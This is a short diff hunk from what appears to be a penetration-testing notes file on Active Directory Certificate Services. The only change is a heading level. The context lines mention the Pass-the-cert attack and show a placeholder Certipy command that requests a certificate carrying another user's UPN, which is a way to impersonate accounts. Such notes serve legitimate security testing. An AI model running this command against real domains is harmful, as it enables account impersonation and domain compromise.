@@ -29,7 +29,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 Should the error `KDC_ERR_PADATA_TYPE_NOSUPP` happen, following the `Pass-the-cert` attack.
 
-### Summary
+#### Summary
 
 ```bash
 certipy req -u <username>@<domain> -p '<password>' -template User -ca <ca> -upn <target_user>@<domain> -dc-ip <adcs_ip>
